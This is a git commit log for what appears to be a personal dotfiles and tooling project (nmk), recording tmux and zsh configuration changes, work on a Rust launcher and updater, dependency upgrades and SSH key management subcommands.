f8ec6cb Add nmr alias
4cb1e27 Simplify implementation
65cb260 Refactoring
0a7e019 Add nbox should-proxy-git
0d39237 Made nbox gateway work with linux
8e6b5ee Add nbox gateway
6bae8a0 Refactoring
0e140af Refactor net
5f7439b Remove docker ip
27c77f7 Remove point to point ip
1c84f0b Add show_hotspot
d329c53 Use workspace dependencies
54b0958 Use rust 1.64.0
fdced5e hosts off for sftp
19f4014 More comment
750ae75 Upgrade dependencies
97fd95b Update quick_xml
f499568 Update help message
f214557 Upgrade quick_xml
39c97ea Update notify
c435a50 Use logical XOR
2f75e6d Update packages
3fb4137 Use i32
54615ec Use smartstring
5fe235c Update on-subnet implementation
810fee5 Add test functions
abf37ea Fix netmask doesn't work on macos
91570eb new command nbox
99fc903 Use Iterator::position
078fcca Upgrade serde packages
aae38d5 Stop using global Dir
44b189b Temporary workaround for cross > 2.1.0
7aff465 Refactoring
475465b Upgrade dependencies
e534c62 Add scripts folder
7bf78d5 More readable
ebca038 Update Rust and dependencies
ed91b18 Fix typo
166e93d Update zprofile
51e445d Add 24 bit colors support
43352af Update template
5379e37 Update ssh keys
d521786 Upgrade dependencies
fc1f3e6 Refactoring
47ffc7b Add full path in infect documentation
8c5813d Upgrade package and macros
6949cd9 Upgrade packages
1479a3c Workaround intellij terminal bug
b503e21 Update zsh configuration
c87a144 Use correct wording
152b30a Upgrade rust dependencies and git submodules
235a49e Use delta
e7a6f7f Reorganize sub command
bd0b43d Upgrade and refactoring
e9a3e93 Disable hosts completion for ssh and scp
2deb63b Small refactoring
c32eef6 Add TmuxCommand enum
2d1ddb9 Update FIRST_NUMBER_IN_LENGTH_OF_DIGIT_CLASS
ed0e3c8 Use .then_some
a0ce1d8 Use rust 1.62.0
edf60fe Move watch to xtask
188beb6 Double history size and renumber window
4e61b6e Update zsh config
bf49e58 Update watch command
5de6bfa Watch chmod event
bfa19ba Watch more event
737ca11 Update zshrc
deef511 Add nmk watch
93b684e Update login.sh
308a7ee Refactor regex
3f30d93 updater: cmdline -> args
71244eb Remove empty directory
d8cd529 Ignore test files
c3b0512 Update login.sh
c8625ed Set executable bit for login.sh
85de1bb Edit zprofile
23c7054 Remove unnecessary files download during build
52b609e Updater use git2
8f2406c Always remove cache
60c414b Upgrade cargo packages
db8d5b0 Update launcher completion on update
22cfcfb Update login.sh
5a80969 Add --ssh
5fea1cc Add DEFAULT_ENV
3ffadda Fix trailing $
abd141e Rename login -> login.sh
f9fcc58 Make login script work with dash
49e28dc Final clion_exclude_folder
0e2b638 Refactor clion_exclude_dir -> clion_exclude_folder
3163762 Change formatting
0b3fea1 Update clion_exclude_dir
a571815 Update all dependencies
d093a6a Refactor exclude_target_dir.rs
73167d8 Add find_exclude_folder
d716a95 Update indexmap
e012004 Remove tinyvec
9865bbc Fix cycle_root_key_table error
eb57695 Fix fd & rg completion
11a402a update ubuntu-etc-zsh-zshrc
eab6945 Add vendor completion to fpath
d06eb48 Refactoring and remove help coloring
364da32 Clap 3.2
673d0db Share instant of repository
956b309 Use git2
af5d50c use '-w' for maximum column size
8954824 Rework pid length
cf95f39 Merge ctime regex into single capturing group
4b3994e Update all dependencies
2d86c54 Add support for tmux 3.3a
03453f9 change pid_to_digit_length to pid_formatted_length
6ae1a3a Update vendor.rs
814eda1 Update init script
f1a3150 Add npm to copy mode list
b8361f8 updater: remove cache file before installing vendor
1efaae8 launcher: rename flag: no_cache -> ignore_cache
32a3df2 updater: select correct vendor file by default
dd7d34f updater: channel selection
fcdc514 More refactoring
75dffd2 Detect sudo flags
71cdb72 Fix ps command on CentOs 7
e98794d Correctly enter copy mode for docker logs
5b03eb7 Add 'nmk desktop fix-kde-default-app'
c6db7db Update login script
3a21935 Avoid allocation
fd8313d Add cargo-install-update to page up copy mode command list
bea34f5 Add Make build
83c90c1 Extract hard coded to variable
29343e1 Support tmux 3.3
9f2b49d Use rust-toolchain.toml
f6cc10b run shell in background
b198f91 Update platform detection
737c4a9 Fix incorrect build info
347ab54 Shorten some code
94b5f77 Remove hard coded sudo
396e1b8 Remove chrono
95bdddf Small refactoring
380ec67 Do not silently ignore exec error
63be843 nmk use time.rs instead of chrono
e639a90 send-key-or-copy-mode refactoring
641ad89 remove f7 and f8 binding
819e463 Use simple comma separated list of command
e32e3f5 Upgrade packages
83bb82c Check sudo properly
6f1e096 Add nmk tmux-utils send-key-or-copy-mode without checking for sudo
aa144e0 Rust 1.61
79e29be Give name to some literal
4a90c3c Bring back short options
6967d62 Refactor xtask
3395257 Upgrade packages
639e25d Add #![deny(rust_2018_idioms)]
db353e0 Upgrade packages
a280931 Handle unicode name length
1f12662 More readable
0a0dd9d Add more tests
ae9a554 rework ItemName formatting
efa23ee Remove unnecessary `as usize`
50662c2 kill-pane-process: small refactoring
c6ed231 Run shell in background
680c4d6 kill-pane-process: filter out pane pid
5ed11c6 Add ability to kill other user process
c447951 Refactoring
4f4b409 Rename variable
fe29611 Query parent process id but not use yet
0ed64e2 Update all dependencies
067cd06 Dont truncate long command
d0eef39 Don't compare then reverse
410774a Added nmk tmux-utils kill-pane-process
fc309a4 Upgrade rust to 1.60
b7bc405 Fix missing vcgencmd
3be3715 Update ssh keys
b34355c Use with_context
6952830 const fn
60847ff Use time trait
33da6c3 tmux-support -> tmux-utils
897ee0c Remove unused constant
4f6cd8e Small refactoring and upgrade packages
a8856c4 Upgrade packages
3fb602d Upgrade
d04cd72 rustc 1.59.0
fbd3f8b Refactoring
e6eead6 Root don't use sudo
ccadde8 Upgrade clap
6a98f0e Remove detach-on-destroy
a6635a8 Upgrade all things
b348d18 Upgrade dependencies and packages
0268808 Rust 1.58.1
cb11904 Rust 1.58.0, upgrade, and refactoring
cfd1bba remove tmux subcommand
b940719 Split build_info into separated crate, nmk doesn't contain build time information
984af63 pattern matching on slice and use replace std::process::exit with panic
ae7f3fa move dist/ to target.cross/dist/
f515e4f Remove warning
1c7b25c Explicit flush xz
1b34292 Remove python script
0a17cda Add dpkg check
a6f01b9 Fix launcher name
e2c4324 Fix log not show in nmkup
f1540d1 Use prefer config filename for cargo
5fde14e Refactor and prevent accidentally publishing
1132ebf Add xtask printenv
a31706f Refactoring
a1e1778 Upgrade packages and single Cargo.lock
b7a72fd Order version correctly
7fe74db Add clean unused linux kernel command
7fa7d8d Refactoring
69ad2b7 Replace build.py with xtask
93698c1 Using workspace to support cargo xtask
ff007c7 Migrate to clap 3.0.0
bbc2078 Host public key
e5658fd Add public key
467f406 Add change-nui-gpg-card
0d69ff5 Use TMUX const
3296cb1 Prevent infinite loop when key table is not match
a05994b Cycle root table using C-r
1912803 Fix no-root-fn color
221723f Add more comment
b64c69c Upgrade packages and submodules
a3164cc Refactor macros
6268a2e Rename database -> cache
55626ef Replace OpenOptions with simple alternative
efc3db2 Add more context to error
3a9682b serialize toml by serialize to toml::Value first to handle ValueAfterTable error
0d24fac Remove figment custom ser/de
d5ebb7b Database is relative to config file
0cb15d1 Remove NMK_TMUX_VERSION, add --config and NMK_CONFIG
fed78d8 Upgrade code & dependency
55b6bff More precise usage time
a500641 Add cargo to page up list
e81fb83 Introduce better scope
5808c73 Add .nmk.db
926f495 Add copy_mode_commands
ddb90fd Nmk read configuration from nmk.toml
a832a7d add comment and refactoring
a5d3032 rename send_pageup_or -> send_key_or_command
2294286 Use alternate_on directly on empty
3b1423c Test before CI
d19f8b2 Update PageUp copy mode commands
3206887 Able to check multiple pane current command
5e8bb74 Update vim fugitive shortcut
8de5df2 Refactoring
7119e37 Use C-f for switch root key table, this match C-m for toggle mouse mode
1f26ae2 Small refactoring
0e4a8c0 Upgrade submodules
8bc9530 Add rust-toolchain file
3510f26 Remove smallvec, simple vec is better for us
7ac4b6f Move struct definition to bottom
98a49c1 Use more derive_more::Display
c051507 Shorter code
9d060f7 Prefer readability
144b65d Remove rarely use key binding
ba726ed Improve ctrl-u
775e78e Ctrl-U use same condition as PageUp
575e2f8 Introduce Color enum
0749e19 Fix Home/End key binding in vendored zsh
1231168 rename alt_root to no-root-fn
bfb0144 Fix Shift-F12 doesn't work on MBP with touchbar
b5ae495 Add alternate root table to disable function key binding
ab2b63e zsh no longer enable copy-mode
1fb4a4d Remap conflict key with default tmux
7d90135 Perfect page up and copy mode
9e05940 Introduce tmux Format
963345a Add note about include-flate
193b6c2 Minor refactoring
1e5582f Use to_string to indicate that output is string
b762e2e Remove unnecessary Path::new
ba0e33e Refactor SshKey
c5e6990 Move PathVec to common lib
8ea4033 Allow nmk log
cd3866b Remove some premature optimization
36406d4 Add usage-exit flag
d6315ab Reduce time usage by xclip checking
12b71ff Add measure_time macro
92342fd Use std::fmt::Write
0e5b878 Use extend
114f10b Upgrade packages
c940496 Group status right config
e5d1aef Refactor config
5dbc2ae More readable config
054420a Refactoring
ea72341 Fix status_right
decde01 Use readable output
d994f92 Fix status right
d3bb83b Rebind choose-tree to F7
4d7501c Toggle mouse using F6
0ff72b3 Fix mouse status on older version of tmux
1cbea22 Show mouse on status bar
77ec940 Make it easier to add logic in the future
076911b Do not enter copy mode if viewing journalctl log
4487fea Toggle mouse mode using Ctrl-M
0e5adfd Small refactoring
1b9cd41 Upgrade packages
e07a241 Refactor for more readable
b08ece8 Rust 2021 edition
0d27aac Upgrade dialoguer
63ed7e2 Refactoring
9491ef4 Explicit show the type of reference used in unsafe code
ee9f5fa Upgrade packages
c3d2fba Update packages
3ff6192 Color auto
a0ab5e4 Upgrade simplelog
528cdd2 Refactor logic
e566ef8 Refactor and downgrade simplelog to make logging work again
e00e2f1 Move pyenv shims exporting to outer scope
ae1c5dc Refactoring
f829763 Rework path_vec test
8787981 Remove double unique calling
7153e18 Refactoring
e13eea7 Alter TERM if -2 is set
564cc25 Rename EPOCHSECONDS to BUILD_EPOCH_SECONDS
735f400 Update dependencies
dfd00fd Hard code completion name to avoid refactoring issue
8cc1054 Upgrade packages
4be0e6c Refactoring
18d0f9e Update packages
5d4e5e1 Upgrade packages
5421337 Add display impl
18b246c Use anyhow::Error
4ea00fa Use normal install if destination doesn't exist
ef57cca Revert "Prevent install to symlink fail"
a5312fc Prevent install to symlink fail
72a2b77 Upgrade dependencies
8e31f91 Add nmk template sub-command
4b32b2b Use bool::then
a84d532 Select vendor files using dialoguer
b2c948e Use usize::next_power_of_two
3ea0791 Update help text
60bd18f Introduce TmuxCommandBuilder
bb0699c Suggest key adding
c628ec8 Infecting -> Infected
c479f7f Introduce Display struct for SshKey
49d3617 Remove etc/ssh/options in favor of infect sub command
1576e1e Add ssh option to SshKey
bc600c0 Add options to disinfect
6b5868c Avoid unnecessary allocation
57b6a2c Support all kind of ssh keys
5bf61a7 Add infect sub command
868c2e6 Select mode using LaunchMode
5277fba Disable vim visual multi on vim < 8
9c250bd extract NMK_LAUNCH_MODE exporting to separated function
f4293f4 Update login
55540df NMK_START_MODE -> NMK_LAUNCH_MODE
2912d79 Update NmkPath
420aad2 Upgrade submodules and rust dependencies
2342631 Change wording, entrypoint -> launcher
5f61c78 Move firebase config to nmk
837ece3 Update README.md
a4e5f4e Clear buffer right before read line
f05eef5 Add missing semi-colon
dcd35a8 Add trim_inplace
5748636 Avoid additional allocation
7d94b68 Refactor get arch
0ffde49 Slightly slower but more readable
266d8fa Use fastest implementation of generate_get_architecture_script
f01f3d4 Update init script
23e7bde Remove --backup from nmkup and refactoring
ea73dd3 NmkHome report error on fail
5066034 Fix test fail and add miri to test unsafe code
a0f61b5 Enable repeat tmux next-layout
77306a5 Avoid VecDeque allocation
597199a Relax NMK_HOME requirement
4a15459 Refactoring
8662ef8 Update README
f499157 Update pathogen
bc359d7 Change NMK_INITIALIZED NMK_START_MODE
001b31d Fix issue with cached entrypoint
853e740 Update help
be5a233 Add NMK_INITIALIZED to help determine if tmux/zsh is proper initialized
45f5219 Restructure program to make completion work
f69d215 Change subcommand from update to setup
6c7deb2 Generate nmk completion
3fa1ba1 Rework entrypoint and updater
c81abba Update packages and git submodules
6bac6ba Upgrade packages and move code around
b843ea6 Split function to easily test join output
a1da27a Update packages
5257192 Make use of any
68eb076 Remove unnecessary async
18b3fd9 Remove some redundant code
f613948 Support tmux 3.2a
f41f8e7 fix comment
03c9b9a Update submodules and rust dependencies
c6806ee Fix pyenv warning
833c1c8 Use Path::display()
e144785 use .write_all when write literal string
9a66255 Refactoring
d80e2f3 Add strip_components
5a3ae2d Don't try to fix EDITOR
728fb10 Upgrade packages
6c7f947 Refactor extracting to more explicit
2614986 Upgrade packages
021bb89 Do not ignore systemd
dad9704 Upgrade packages
9d2701b Ignore .zsh_sessions
70dbb70 Fix overflow
ea2b7c0 Update human_time
88941db Use same_file crate
9339747 Use cfg-if
788c35d Refactoring
add0428 Fix completion on vendored zsh
3d49000 Update info
a728423 Use ref to make it clear that cmd is borrowed
40d9429 relative path is never use
e019a76 There is no reason to use SimpleLogger
d29e781 Rename variable
f99083f Upgrade packages
7fa727e Refactor and upgrade dependencies
7fd305d Build vim-init using shell-word
67f0c1b Show unit in --usage
78aba0f Refactor tmux version
226dd9c Support tmux 3.2
2ee17e3 Optimize for size
8ee251d Add /vendor to dotfiles
7816525 Update .gitignore
ba01126 Vscode completion
4d4aae1 Avoid String allocation and rename parts -> components
f42770c Add share config
8aa55ec Refactor HumanTime
9f85adf add build on to build info
3296ce0 Change .expect message
887e90c Avoid creating string
ea007b2 Update platform checking
eafd81a Version::from_version_output take &[u8] not &str
0cc20f2 Update zsh comment
d4d622b Fix clippy lint
3a1337b Update clean
b587a4c Update clean target
319c87c Refactor, upgrade, and fix build cache issue
98d00ac A little more readable
a676e89 nmkup: filter vendor by arch
f288636 Upgrade dependencies
66d3317 Refactor term checking
49f87d9 Upgrade dependencies
062e5c5 NMK_TMUX_VERSION is set by entrypoint
2d2da01 Fix wrong mtime
f7b0aa6 Merge backup code
107a48b nmk: add backup subcommand
20c1b62 Remove trailing whitespace
193c786 Put derive in correct place
822ca20 Upgrade packages
7968cb7 Update zprofile skeleton
b51fc5a Refactoring
9808064 Add comment
5ae2a98 Truncate file before update
938b008 Fix return type of function should be a list
0634cfc Add function to start jetbrains-toolbox from command line
ee2b139 Update dependencies
cf2a5ea Replace ci script by Makefile
a983a59 Document why we include uncompressed string
a84268e Show only first file that contain os version
89a6cf2 Rework backup logic and remove unnecessary check
debd463 use Vec::retain
6d88523 Reduce error size
3c8a2ab Set pure default branch to main
e5d27fc Upgrade dependencies
5c3e2d2 Refactor logging
94418ef Improve dotfiles directory checking
c409345 Refactor and update dependencies
f62e2f8 nmkup: log download data url
2fa1cf9 nmkup detect architecture using shell script
a9c9fc9 Change wording
c43df4c Upgrade dependencies
0fdf342 Rename variables
e08d61f use Iterator::try_for_each
61df689 Rework ssh login
fa752c2 Fix ls color
ce311fd move set_env to entrypoint.rs
5daf53f Refactor and run clippy
7bc4f32 Upgrade packages
b7df2c8 Rename macro
fba8189 Update zsh resource files
d33c5f1 Use armv7 build for raspberry pi 4
168d8ed Fix extracted entrypoint has wrong size
b4dfe61 Use custom error type to show error location, enable strip mode again
defb30c Upgrade dependencies
1b5c09a Simplify get architecture by use join
cb9f72d add custom Result type
645651b Refactor PathVec
df4c19d Refactor to not use as_ref
22490d4 Upgrade to tokio 1
8d28b1c Keep symbol for release build
182a517 Upgrade packages and refactor
67d55e5 show usage time in milliseconds
b872e0c refactor PathVec
33516f1 opt -> cmd_opt
a39b7d1 ssh: try nmk from target dir
818e3cf Remove NMK_TMP_TMUX_CONF
667f056 move completion code to right place
8dc70a5 Fix fpath without hack
4300c5c update zsh config
a1322f6 Clean whole package to simplify cache invalidation
b65b0f0 Update readme
2f7f8eb Use Path to check file existence
7b945fb Remove workaround in build script
babef60 Add NmkPath
2ea3c4f Refactor
5e78543 Simplify config rendering
6615bf7 Use vec truncate
6591076 Refactoring
c12ecf2 Refactor version and upgrade libraries
d818981 Avoid unwrap
380a596 Refactor human time
3b7bc16 show rustc version in `nmk info`
7f52672 Upgrade all packages
a91f26f Update version manager detection
77c6286 nmk: check init doesn't need file stem
b3dd912 Keep it simple
262991c Add tmux 3.1c
15af0a5 Upgrade packages
4bed0c1 Fix wrong logic
af93c3c Update vim plugins
9dd34a4 Only check for TMUX since NMK_TMUX_VERSION is not always declare
f2ef27a Refactor tmux config
c838a4d Panic if version info is missing
110f4f0 Don't enter copy mode outside tmux
22cf82b filter empty NMK_HOME
dbfe12b Avoid allocation for PREFERRED_EDITORS
35d3a93 build.py: exit when command fail
d49982e Upgrade packages
f372417 Move test to correct location
1f220c9 Avoid unnecessary clone
e8f38e9 Generate less code on macos
7e9acb8 Use inner debug impl for PathVec
70aea70 more readable parsing
f28bf98 Upgrade packages
73032df Refactoring
dad1c06 Change default update suggestion period
3bd6c90 Upgrade dependencies
35873b3 Remove unnecessary import
e80b951 Remove unnecessary ref
f2ee91b Use toml to print info
e210937 Suggest for update after 30 days
a0ce4d1 Disable lsd color for jetbrains terminal
ee52e15 Support lsd
6548374 ci can run from any directory
5d4ece1 Use Shell::variants()
a489a5d Don't use structopt external_subcommand, it has bug
93e5d1c Organize files
af68dc2 More strict ssh login
990f1fe Remove --no-autofix
aa64faa Print debug options
e7108bf Remove render sub command
1e9cc09 Check xclip existence by nmk
44cbba2 Modify Tmux key binding
fe3cc4a Remove temporary config create during attach
b658703 Less verbose error
31de5ac Add --print-config and make copy to system clipboard work on osx
f043855 Remove unnecessary .expect() call
b66c0b1 Remove tmux temporary environments
d3856ec Goodbuy Scala
d21a2ca Refactor and upgrade dependencies
7ab96a5 idiomatic rust
dcf4987 Upgrade dependencies
9161330 Show duration since build if entrypoint is too old
c105c12 I don't think it useful but keep it here, revert back to use absolute path config
3a12a55 Add more guard before mangle config name
f0dd5c5 Mangle config path on remote server
307e11a Move start time into Opt and rename --ssh to --motd
c0c96f0 arg -> opt and remove VIRTUAL_ENV magic
493ce18 Add --backup to nmkup
9b18025 Keep .gitignore in .archiveignore
0cc4619 Use Command::arg0
6922da3 Download file using media_link
462f655 gsutil cp -> rsync
6da440c Store only version in NMK_TMUX_VERSION
3e3e025 Fix NMK_TMUX_VERSION
0144a5a Move files to make Cross happy (cross compile in docker issue)
d799ed2 Detech arch using rustup-init script
9abeeb6 Add nmk info subcommand
712f9a7 Correct arm target name
cfba18a Improve tmux startup time
8ca59af Update dependencies
b38af18 Ignore zsh/.zcompcache
42577d1 Fix can't specify NMK_HOME for nmkup
29e89e3 Shorten authorized_keys command option
e4734cd Replace hard coded with constant
de40e29 More useful panic error
6cab7ec Always download entrypoint when .nmk/bin/nmk doesn't exist
3769a73 Prepare login shell properly
4396719 Allow starting login shell without tmux
04ad78c Show usage time using microseconds unit
25d1c39 Don't show full path to tmux in ps output
4245d43 lib.rs doesn't need invalidation
c767c79 Follow Rust way of licensing
ff1ff63 Update signature
01126cc Add armv7 back to target triple
5221c17 Replace Makefile and support more target
d9a13a3 Change git url
735e9bb Use str::from_utf8
fdae1cd Add -u flag
837289f Fix tmux in alpine doesn't display color
218b3b4 Clarify reasons why zsh global resource configuration files are ignored
5f685be Add Arm64 build
e2697bf Try filter vendor files
7e9bc41 Force NMK_HOME to be absolute path
0ffb4ae Support tmux 2.6 and later
8f8be71 Refactor to shorten main function
60737fe Move nmkup.nuimk.com to etc
5d89850 Log respect -v flag
6474d86 change /local to /vendor
2d92b4b Parse only interested object metadata
59c6c8d Change prefix and exclude files from dotfiles.tar.xz
f30d6ad Display some os information before pick vendored files
6852c4c Add ability to use vendored files
40947ae Additional fpath
e5940fb Detect local installation of zsh and fix fpath
26edb2b Use basic_scheduler
291f676 Use no-store header
59d1245 Remove unused python scripts
533bb72 Change artifact root
8a43f66 Upload using gsutil
0e21a75 Fix installation script
52c6944 Update readme
3997aeb nmk: change -d to -v
d45f47b Big refactoring
564e2e0 Use reqwest
d2c5b71 split common uri path
96c54a2 Apply cargo fmt
4f08574 Declare constant using macro
5137211 Change column width to 100
53f225c use chain iterator
2e91401 Easier to read code
85b5ef6 Revert "jetbrains terminal fix"
11b0e48 jetbrains terminal fix
c46bff4 Rename zshrc source files
27e6c17 Upgrade packages
ad91675 Restructure
bdbc4ea Fix run nmkup from install script
e2ec384 Merge nmk & nmkup into single binary
09d9295 Add cross build for amd64 linux musl
91ab470 Upgrade packages
42ddbfe Add tmux 3.1b
234b9c3 Prepare 3.1a version
5d74b84 Update Makefile
0ae6c4d Don't use sccache
f9a6fab Fix builder build fail
f506363 Fix unreadable tmux text
85ff17e Generate Tmux 3.1 config
d208bac Avoid allocation
45f4267 Upgrade dependencies
50a423a Fix sha doesn't show in arm build
49c48b5 Use once_cell
58e61c1 Install sccache
89c8c51 check if binary specify by EDITOR is available
bb5a6de Refactor to avoid heap allocation
4089b9f scala: migrate deprecate method
006397d Simplify tmux exec & login with exec method from std::os::unix::process::CommandExt
4aa230a Upgrade all dependencies
7ea6edf Replace custom code with Debug implementation
d1f0f92 Remove nmk.go
aaf5be6 Use structopt in nmkup
3963c29 Refactor to structopt
195bc6e Move more code to common
ef08011 Fallback to SimpleLogger
04d9972 nmkup: nmkpkg WIP
86595ba Upgrade package and submodules
482401d change from nmk.nuimk.com to nmkup.nuimk.com
f9c0fc9 add into_client
34cc752 nmkup: more force install
4282299 nmkup: add option to force install
8b699e8 fix musl build panic
1436cd8 install entrypoint
46d6a1b Fix wrong default NMK_DIR
3a001d2 nmkup: add one-line setup and self install
d048300 update link
db77a11 Fix fail update by nmkup
0a5872d add nmkup
37f137a Run test with debug build
93ceac2 add common and nmkup crates
8f6ec6f fix issue exiting from multiple cursor mode
3c7ed6b Update build configuration
4b2f3fa nmk.rs: refactoring
a13343e upgrade dependencies
7cfa86c warn when using local tmux, close #29
9221871 tmux 3.0a
ecbc951 upgrade dependencies
45f6e26 fix some wierd LD_LIBRARY_PATH
9ba3c8e tmux: 3.0
886575c real clean before build
078751a don't save/restore cache
286cfdc clean main package before build
6499148 keep lh in history
2834d2c Temporary disable build cache
0728c9a nmk.rs: rename argument to arg
411d4ad Update readme to trigger build
4ff3c0c upgrade git submodules
c3a26a2 ci: build using multi-core
bd3fdd9 Remove cross configuration
3438e62 nmk.rs: refactor makefile
fac885b nmk.rs: remove build dependency on date
d023640 Print output size after release make
e17cce5 nmk.rs: build nmk.rs with normal instance since waiting time is too much
c9c4c4e nmk.rs: build using high-cpu instance
b5a99fd nmk.rs: refactoring
2957610 nmk.rs: replace error! and exit by panic
94db916 nmk.rs: more verbose error
76b3c68 mnk.rs: upgrade dependencies
a91eef7 nmk.rs: use unreachable macro
e9e7272 upgrade dependencies
312b3d7 Revert "nmk.rs: build speed optimize"
d124ff1 nmk.rs: build speed optimize
0d54017 nmk.rs: show rust toolchain version
59bb301 nmk.rs: refactoring
1805536 nmk.rs: cleaner syntax
8a6520c nmk.rs: close #28
412175f nmk.rs: change log backend, close #27
a4d724f ssh: fallback to /usr/local/bin/nmk
ad438fe nmk.rs: remove hard-coding
320f833 zsh: automatic checking for new ssh socket
45b16fb Upgrade and refactoring
04d6db5 Fix: #26
a4ff3f2 nmk.rs: Add arm build
e11f1e2 update Makefile
0a28719 upgrade dependencies
bfad853 nmk.rs: platform::get to static
6c9d970 nmk.rs: refactoring
5e90974 Reduce bundle size
7809e38 horizontal: turn cozy on by default, fix #25
6b24087 Add prompt pure as submodule
4d0fb0c Upgrade dependencies
50633a1 Add make config for arm
494eeb1 Passthrought EPOCHSECONDS
9ba5583 Refactor some go
167fede nmk.rs: unicode and 8 colors option is not require anymore
67a326a nmk.rs: use lazy_static
02a33f3 nmk.rs: fix lint
51be716 nmk.rs: use log_enabled!
5d53049 nmk.rs: use config by reference
a140256 nmk.rs: use FromIterator
341f9a0 nmk.rs: cosmetic changes
f6941ba nmk.rs: simplify return type and logic
d2feb8a nmk.rs: explicitly inform tmux that terminal support unicode
83f310e nmk.rs: reorganize code
20d2e57 nmk.rs: call exec correctly
b122d7e nmk: ssh entrypoint
07e7c59 NMK_ENTRYPOINT -> NMK_BIN
5d6eb3e nmk.rs: show time since last built in all build
6ed3094 upgrade dependencies
d670c1a nmk.rs: remover pyenv and rbenv shims from path
fa74d94 add index map as dependency, prepare for #21
933eb5b nmk.rs: clearer generic type bound
1624999 nmk.rs: refactoring
c6c1c9a show rust toolchain version used for build nmk.rs
41ea309 upgrade dependencies
b4cebd3 update node modules
388956a upgrade scala
57e19b1 update git submodules
a426c65 tmux: switch client using F8
e3e954a nmk.rs: remove from_utf8_lossy
d3cdc81 zsh: add reset gpu alias
6b7a35b update zprofile
3b8fda9 nmk-update: remove stable channel
91bae2b nmk.rs: code refactoring
67e0e37 nmk.rs
35fef2c nmk.go
3cd3cf8 horizontal: refactor to add new feature from pure
8d32299 Don't continue vim in background
78eb0c4 Remove object policy
b520dae change spaces to tab
11826f3 bundle prompt pure
6c5e8dc horizontal: change prefix and serial console detection logic
34c1050 horizontal: use condition that work on mac
11e3b6f horizontal: don't set title on physical terminal
e84b1e7 nmk: login shell use socket as well
5ccae74 add update-nmkpkg
0c44b83 tmux 2.9a
96da5b9 Update default zprofile
f8b091f Only apply on ssh connection
b736016 zsh: reduce external command call (ls)
f27abef zsh: auto update tmux environment in ssh connection with agent forward
3b4f533 Fix removed style
13fdf19 tmux 2.9
bdfa2db upgrade dependencies
8b2dbff unbuffer
43e9ed3 Add google-ddns-updater
65b6740 Upgrade node & git
5c58a71 fix vim sort in remote ssh session
a5f5b59 remove some scripts
5e9c87c docker pref image
bc314f9 remove unnecessary brace
99f953e correct completion colors on darwin
53e7eef Ignore local directory
736863a Better detect ls version
059a8b1 mac os have bad zsh global_rcs
e252899 Update README.md
15cf3a2 tmux: Shift Fn to send key Fn
f04dbdf remove nmk-merge
6abd7c7 rename adhoc script
a166912 Revert "Produce useful message when cannot start tmux"
d57cc1c Revert "fix entrypoint"
a3836e0 fix entrypoint
129026e Produce useful message when cannot start tmux
8419adc remove local directory
69e48a9 upgrade scala
7469258 Revert "nmk: support alternative local dir"
b52ac02 nmk: support alternative local dir
2ba5d05 Correctly load pyenv virtualenv
a765eb6 cloud build install only build dependencies
4f3c402 swap order to test build
f5fc676 Auto build nmk.tar.gz using google cloud build
f98c6bf add --copy-to to build script
ec48f77 extract some setup to run-me-sometimes.zsh & setup NMK_DIR in .zshenv
ab889a3 Precompile nvm
5053a5e zsh: refactor
aae5fcd Remove unused code
13dc5d3 fix typo
6fe1638 more autoload functions
adc3168 autoload functions when need
350d46c disable git integration in alpine
4379238 refactor entrypoint script
bfa75ad Fix nmk function
05693ce cat /etc/motd if exist
ce38e5c update ssh-entrypoint
92ce3b5 zsh: properly check version managers
ce13fb0 zsh: reduce nvm pyenv rbenv initialize time
e37ee73 Fix vcs_info error in zsh 5.7
8e2c3c3 gcloud registry cleaner work with any repository
3890a74 just clean don't print size
40e470e tmux: set base index to 0
3731a7a Update ssh keys
a4d01cd tmux: Ctrl-D won't exit copy mode start by Ctrl-U
9e5453e refactor build.py
f53445a Migrate build stript to python code
8e23dd7 Add docker images for bundle archive
3db7c41 Fix CtrlZ in zsh
51c67bb update zsh submodules and yarn.lock
ba689d1 darwin: hide stderr of gpg-connect-agent
50cc3f7 refactor .zshrc
4dbd47e Remove old docs
bb73f6d darwin: fix unicode issues
575c607 Simplify vi alias
6271282 rf() integrate with pbcopy
e70f355 Add new office key
4cfa4ca zsh: fix kubectl completion slow zsh startup time
4ee9a57 Deprecated virtualenvwrapper support
c7009d5 Update ls aliases
9bc2a84 update LH
0d28f50 update zprofile
18d7d24 darwin: remove wrong error log
f177171 darwin: Update zprofile
2dcd932 darwin: fix alias
0fc4c49 update git submodules and node packages
9b24f12 use same convention for function declaration
619442c nmkconfig.json -> config.json
a395285 rewrite clearing temp env logic
eb69251 nmk.py pre exec usage time
cbdd4b5 update six to 1.12.0
26876c1 rename 10-precmd-preexec.zsh -> 10-hooks.zsh
d99a011 Fix wrong docker tag
1f4c7f9 rewrite precmd/preexec
b13d18d rewrite precmd/preexec
805f6e1 remove gcloud completion setup
b7027fe nmk:python use centos 6.10
0a18497 Remove unused dockerfile
5bce429 Fix nmk -l
ee139a2 update nmk.py and docker compose
7c81a6e Change docker default command to "nmk -l"
a5c69bb Introduce NMK_ZSH_GLOBAL_RCS env
7f938fa Make path work in alpine linux
c21edc1 Add enable/disable integration script
0b1fedf add zshrc.pre.d and remove zshrc.pre, zshrc.extra
dd01aeb Update alpine
8ff4980 Fix vcs_info not available
8186d88 Make absolute path not expand symlink
e6a9e11 update git submodules and npm package
bf5292b Keep last 3 build-* tags
adb2af7 Fix case when gpg2 is not available
c22a946 monthly update
38c002e November update
5af9a71 add tmux 2.8
1e40d88 October update
95398d8 Remove vim solarized
8d9b0cf get rid of no longer use script
596086a update submodules
ebfeec8 Relocated comment
6d8be37 Update ssh and gpg keys
36b930e tmux: _ and | key binding
c49fe65 September update
2f4af11 August update
3b26b8a tmux: Add C-t to show tty
724d129 Change kill completion, only complete process with pty
5ca097c zsh: put min TMOUT into variable
77bd004 Add alpine dockerfile
bd638ae Add script to clean gcloud image
9dcd23e Fix gsutil not work on multiple account
b2100a6 July update
26d0a87 vim: fix deprecated warning
582d91a update dependencies
1dedba2 Update git submodules
77f8d90 remove trailing whitespace
29cd2d5 Fix choose tree binding
623fda6 Update tmux navigation
446a2ee Remap tmux keys
50c851a No exec in nmk alias
03d9591 tmux: group config into sections
946b36b Add assembly plugin
8579a04 Spacing and refactoring
33079b1 Update git submodules
c5f70e4 tmux: Add Prefix-C binding to start new session with pane_current_path
9dd8f2c Replace rendering engine with typesafe code
71a6cdf Renaming
e47d9f5 Choose tree zoom available in 2.7 not 2.6
67010e7 Split complex key binding logic into separated file
d78d111 Change F4 to match default key binding of choose tree
bb9563b How it work last time???
ca70bf3 Freebsd xargs not support --null
be9c380 Update README example
ef5e80d No need bash and readlink for shim nmk, nmk-update, and close #11
